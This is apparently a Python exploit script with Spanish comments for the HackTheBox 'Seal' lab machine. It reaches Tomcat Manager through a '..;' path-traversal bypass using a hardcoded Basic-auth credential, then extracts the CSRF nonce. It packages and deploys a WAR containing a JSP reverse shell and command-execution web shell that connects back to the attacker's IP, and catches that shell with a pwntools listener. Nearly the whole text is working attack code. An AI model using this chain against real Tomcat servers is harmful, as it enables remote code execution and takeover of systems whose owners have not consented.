'''
El objeto interactua directamente con el sistema para crear, jugar y borrar varios archivos:

war_work_folder/
├── acatamos.jsp
├── aWARrate.war
└── WEB-INF
    └── web.xml

Todo esto para generar una Reverse Shell (usando este código de Nicolas Mauger: https://gist.github.com/maugern/0845b64730a2c606ec726e48902c3308) al subir el objeto `.war` a Tomcat Manager
'''

#!/usr/bin/python3

import os, shutil, sys, signal
import requests
import base64
import re
from pwn import *
from urllib3.exceptions import InsecureRequestWarning

# Evitamos outputs al jugar con el certificado SSL y sus peticiones.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Variable globales -----------------------.
URL = "https://seal.htb"
manager_url = "/manager/holaaaaaaaaaa/..;/html"

# Clases ----------------------------------.
class Color:
    PURPLE = '\033[95m'
    RED = '\033[91m'
    END = '\033[0m'

# Funciones -------------------------------.
def def_handler(sig, frame):  # Controlamos la salida al ejecutar Ctrl+C
    print(Color.RED + "\ns4l1eNd0...\n" + Color.END)
    exit(0)

signal.signal(signal.SIGINT, def_handler)

def create_jsp_file(file_jsp_name, lhost, lport):  # Creamos archivo .jps
    file_jsp = open(file_jsp_name, "w")
    # >>>>>>>>> Gracias Nicolas Mauger <<<<<<<<<<
    file_jsp_content = """<%
    /*
     * Copyright (C) 2018 Nicolas Mauger - JSP payload
     * Two way of reverse shell : in html and with TCP port.
     *
     * ----------------------------------------------------------------------------
     * "THE BEER-WARE LICENSE" (Revision 42):
     * <nicolas@mauger.cafe> wrote this file.  As long as you retain this notice
     * you can do whatever you want with this stuff. If we meet some day, and you
     * think this stuff is worth it, you can buy me a beer in return. Nicolas.
     * ----------------------------------------------------------------------------
     *
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%
    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}
    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\\n<BR>");
        Process p;
        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;
        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }
        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
    int port = """ + str(lport) + """;
    while (port < """ + str(lport + 100) + """) {
        try {
            Socket socket = new Socket( \"""" + lhost + """\", port++ ); // Replace with wanted ip
            Process process = Runtime.getRuntime().exec( shellPath );
            new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
            new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
            break; // if stream connect successfully, we stop trying port.
        } catch( Exception e ) {}
    }
%>
</pre>
</body>
</html>"""

    file_jsp.write(file_jsp_content)
    file_jsp.close()

def create_xml_file(file_webxml_name, file_jsp_name):  # Creamos archivo web.xml
    file_webxml = open("./WEB-INF/{0}".format(file_webxml_name), "w")

    file_webxml_content = """<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
  <welcome-file-list>
    <welcome-file>""" + file_jsp_name + """</welcome-file>
  </welcome-file-list>
</web-app>"""

    file_webxml.write(file_webxml_content)
    file_webxml.close()

def create_files(lhost, lport):  # Controlamos los archivos a ser creados
    # Nombres de directorios
    actual_path = os.path.abspath(os.getcwd())
    folder2work = actual_path + "/war_work_folder"
    folder_xml = "/{0}/WEB-INF".format(folder2work)

    # Borramos el directorio en caso de existir
    shutil.rmtree(folder2work, ignore_errors=True)

    # Creamos los directorios
    os.mkdir(folder2work)
    os.mkdir(folder_xml)

    # Nos posicionamos sobre el directorio de trabajo
    os.chdir(folder2work)

    # Creamos archivo JSP
    file_jsp_name = "acatamos.jsp"
    create_jsp_file(file_jsp_name, lhost, lport)

    # Creamos archivo WEB.XML
    file_webxml_name = "web.xml"
    create_xml_file(file_webxml_name, file_jsp_name)

    # Creamos archivo .zip y lo renombramos a .war
    file_war_name = "aWARrate"
    os.system("/usr/bin/zip -q -9 {0}.zip -r ./".format(file_war_name))
    os.rename(file_war_name + ".zip", file_war_name + ".war")

    return folder2work, file_war_name, open(file_war_name + ".war", "rb")

def upload_war(folder_work, file_war_name, file_war_content):  # Subimos objeto .war a Tomcat Manager
    session = requests.Session()

    # Nos autenticamos para extraer la sesión
    headers = {"Authorization": "Basic dG9tY2F0OjQyTXJIQmYqejh7WiU="}

    r = session.get(URL + manager_url, headers=headers, verify=False)
    r = session.get(URL + manager_url, headers=headers, verify=False)  # La hacemos dos veces porque pasa algo extraño si se hace una sola.

    csrf_token = re.findall(r'\?org\.apache\.catalina\.filters\.CSRF_NONCE=(.*?)">List', r.text)[0]

    # Subimos el archivo WAR
    data_get = {"org.apache.catalina.filters.CSRF_NONCE": csrf_token}
    data_files = {"deployWar": file_war_content}

    r = session.post(URL + manager_url + '/upload', params=data_get, files=data_files, verify=False)

    # Validamos que todo este bien
    if r.status_code != 200:
        print("[" + Color.RED + "-" + Color.RED + "] Valida que se esten generando correctamente las sesiones y los tokens.\n")
        exit(1)

    # Ejecutamos la reverse shell.
    r = requests.get(URL + '/%s/' % (file_war_name), verify=False)

    # Bajamos y borramos el deploy hecho por el objeto WAR
    data_get = {
        "path": "/%s" % (file_war_name),
        "org.apache.catalina.filters.CSRF_NONCE": csrf_token
    }
    r = session.post(URL + manager_url + '/undeploy', params=data_get, verify=False)

    # Limpiamos entorno de trabajo (si quieres ver los archivos que estamos generando, simplemente comenta la siguiente linea)
    shutil.rmtree(folder_work, ignore_errors=True)

def print_help():  # Uso del programa
    print("Uso: {0} <attacker_ip> <attacker_port>\n".format(sys.argv[0]))
    print("Ejemplo:\n\t{0} 10.10.123.123 4433".format(sys.argv[0]))
    exit(1)

def parse_args():  # Validamos argumentos
    if len(sys.argv) != 3:
        print_help()

def main():  # Controlamos el flujo del programa
    banner = base64.b64decode("CuKVk+KUgOKUgOKVluKVk+KUgOKUgCDilZPilIDilIDilZbilZMgICAK4pWZ4pSA4pSA4pWW4pWRICAg4pWRICDilavilZEgICAK4pWlICDilavilavilIDilIAg4pWR4pSA4pSA4pWi4pWrICAgCuKVmeKUgOKUgOKVnOKVmeKUgOKUgOKUgOKVqCAg4pWo4pWZ4pSA4pSA4pSA4oCiIGJ5IGxhbnoKCkhhY2tUaGVCb3ggLSBTZWFsIC4uLiBTY3JpcHQgcGFyYSBvYnRlbmVyIHVuYSBSZXZlcnNlIFNoZWxsIHN1YmllbmRvIG9iamV0byAnLndhcicgYSBUb21jYXQgTWFuYWdlci4K").decode()
    print(Color.PURPLE + banner + "\n" + Color.END)

    # Creamos: Carpetas de trabajo, archivo jsp y archivo xml
    array_files = create_files(lhost, int(lport))

    # Obtuvimos: carpeta_de_trabajo, nombre_del_archivo_war, contenido_del_archivo_war
    upload_war(array_files[0], array_files[1], array_files[2])

if __name__ == '__main__':
    parse_args()

    try:
        r = requests.get(URL, verify=False)
    except:
        print("[" + Color.RED + "-" + Color.END + "] Agrega el dominio 'seal.htb' a tu archivo '/etc/hosts'.")
        exit(1)

    lhost = sys.argv[1]
    lport = sys.argv[2]

    try:
        threading.Thread(target=main,).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure(Color.RED + "La conexión no se ha obtenido... Valida IP" + Color.END)
        exit(1)

    # Obtenemos shell interactiva
    shell.interactive()
